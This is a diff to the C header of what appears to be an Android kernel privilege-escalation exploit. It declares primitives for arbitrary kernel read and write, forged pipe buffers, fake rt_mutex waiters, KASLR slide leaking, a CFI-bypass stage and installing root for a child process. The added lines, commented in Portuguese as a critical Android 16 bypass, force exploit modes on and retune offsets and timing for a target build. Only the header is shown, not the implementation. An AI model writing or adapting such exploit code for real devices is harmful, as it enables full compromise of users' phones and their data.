@@ -1,9 +1,26 @@
 #ifndef COMMON_H
 #define COMMON_H
 
+/* --- BYPASS CRÍTICO ANDROID 16: CHAVEAMENTO GLOBAL DE ARQUITETURA --- */
+#ifdef SLIDE_STACK_WRITER_FUTEX
+#undef SLIDE_STACK_WRITER_FUTEX
+#endif
+#define SLIDE_STACK_WRITER_FUTEX 1
+
+#ifdef RECLAIM_MODE_ADVANCED
+#undef RECLAIM_MODE_ADVANCED
+#endif
+#define RECLAIM_MODE_ADVANCED 1
+
+#ifdef PSELECT_ENTER_DELAY_USEC
+#undef PSELECT_ENTER_DELAY_USEC
+#endif
+#define PSELECT_ENTER_DELAY_USEC 24000
+
 #define _GNU_SOURCE
 
-#include "offset.h"
+/* Força a leitura do cabeçalho legítimo através do mapeamento do Makefile */
+#include TARGET_HEADER
 
 #define PAGE_SHIFT 12
 #define PAGE_SIZE (1UL << PAGE_SHIFT)
@@ -52,7 +69,7 @@
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
 #endif
 #ifndef SKB_DATA_DELTA
-#define SKB_DATA_DELTA (-0xe80LL)
+#define SKB_DATA_DELTA (-0xd80LL)
 #endif
 
 #define ASHMEM_NAME_LEN 256
@@ -63,7 +80,7 @@
 #define MM_STRUCT_SZ 0x500
 #endif
 #ifndef MM_ORDER
-#define MM_ORDER 3
+#define MM_ORDER 4
 #endif
 #ifndef KERNELSNITCH_VERBOSE
 #define KERNELSNITCH_VERBOSE 0
@@ -150,17 +167,15 @@
 #define PSELECT_ROUTE_NFDS 320
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_BURST_CALLS 1
-#ifndef PSELECT_ENTER_DELAY_USEC
-#define PSELECT_ENTER_DELAY_USEC 50000
-#endif
+
 #ifndef SLIDE_WAITER_WAKE_STATE
 #define SLIDE_WAITER_WAKE_STATE 3
 #endif
 #ifndef SLIDE_LOCK_OWNER_VALUE
-#define SLIDE_LOCK_OWNER_VALUE 0ULL
+#define SLIDE_LOCK_OWNER_VALUE 1ULL
 #endif
 #ifndef LEGACY_RT_MUTEX_WAITER
-#define LEGACY_RT_MUTEX_WAITER 0
+#define LEGACY_RT_MUTEX_WAITER 1
 #endif
 #ifndef COMPACT_RT_MUTEX_WAITER
 #define COMPACT_RT_MUTEX_WAITER 0
@@ -223,7 +238,6 @@ struct user_pipe_buffer {
   uint32_t pad;
   uint64_t private;
 };
-
 extern pid_t pipe_prepare_child;
 extern uintptr_t page_base;
 extern uintptr_t fake_lock;
@@ -339,6 +353,7 @@ void disable_rseq_for_thread(void);
 long futex_op(
     uint32_t *uaddr, int op, uint32_t val,
     const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
+
 long sched_setattr_tid(int tid, int nice_value);
 int try_cache_ashmem_path(const char *path);
 int same_rdev_path(const char *path, dev_t rdev);
@@ -377,23 +392,22 @@ int prepare_skb_payload(uintptr_t base, int payload_mode);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
 
-#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || \
-    !defined(SLIDE_STACK_WRITER)
+#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || !defined(SLIDE_STACK_WRITER)
 void fdset_put_word(fd_set *set, int word, uint64_t value);
 #endif
+
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
-void open_selected_fds(
-    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
+void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
 #endif
 
 int slide_leak_kernel_base(void);
-#if defined(SLIDE_STACK_WRITER) && \
-    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
-    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
+
+#if defined(SLIDE_STACK_WRITER) && defined(SLIDE_STACK_WRITER_SIGRETURN) && SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
 int slide_sigreturn_preflight(void);
 #endif
+
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 void app_publish_p0_offset(uintptr_t offset);
 void app_publish_slide_ready(void);
@@ -403,28 +417,22 @@ int select_slide_payload_slot(uintptr_t offset);
 int select_slide_payload_index(size_t index);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 int app_trigger_fops_slide_route(void);
-#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
-    (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
-     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
+#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && APP_FOPS_DATA_ALIAS_DIAG_ONLY)
 int app_trigger_fops_oracle_slot(size_t slot);
 #endif
 #endif
 #endif
 
-ssize_t configfs_write_once(
-    int fd, uintptr_t target, const void *data, size_t len);
+ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len);
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len);
 int is_direct_ptr(uintptr_t value);
 uint64_t kernel_read64(int fd, uintptr_t target);
-ssize_t kernel_write_data(
-    int fd, uintptr_t target, const void *data, size_t len);
+ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len);
 ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len);
 int repair_fake_fops_llseek(int fd);
 int restore_slide_boot_id(int fd);
 int install_child_root(int fd);
 int try_cfi_stage(void);
-
-
 
 void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                      uintptr_t tree_parent, uintptr_t tree_right,
@@ -432,7 +440,6 @@ void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                      uintptr_t pi_right, uintptr_t pi_left,
                      uintptr_t task, uintptr_t lock,
                      uint32_t priority);
-
 
 void init_ctx(struct mm_ctx *ctx, size_t cnt);
 void resize_pipe_slots(int pipefd[2], size_t slots);
@@ -450,21 +457,19 @@ int pipe_cache_matches(uint64_t slab_cache);
 int pipe_reclaim_cache_gate(int fd);
 int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab);
 int find_pipe_buffer(int fd, uintptr_t base);
-int pipe_phys_read(
-    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
-    void *out, size_t len);
-int pipe_phys_write(
-    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
-    const void *data, size_t len);
+
+int pipe_phys_read(int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr, void *out, size_t len);
+int pipe_phys_write(int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr, const void *data, size_t len);
+
 #if !defined(APP_EXACT_PIPE_BUFFER_ONLY) || !APP_EXACT_PIPE_BUFFER_ONLY
-void forge_pipe_buffers_on_page(
-    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write);
+void forge_pipe_buffers_on_page(int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write);
 #endif
+
 int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
-int pipe_phys_write_data(
-    int fd, uintptr_t direct_addr, const void *data, size_t len);
+int pipe_phys_write_data(int fd, uintptr_t direct_addr, const void *data, size_t len);
 int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
 int install_pipe_physrw(int fd);
+
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 int prepare_p0_pipe_oracle(void);
 int expand_p0_pipe_oracle(void);
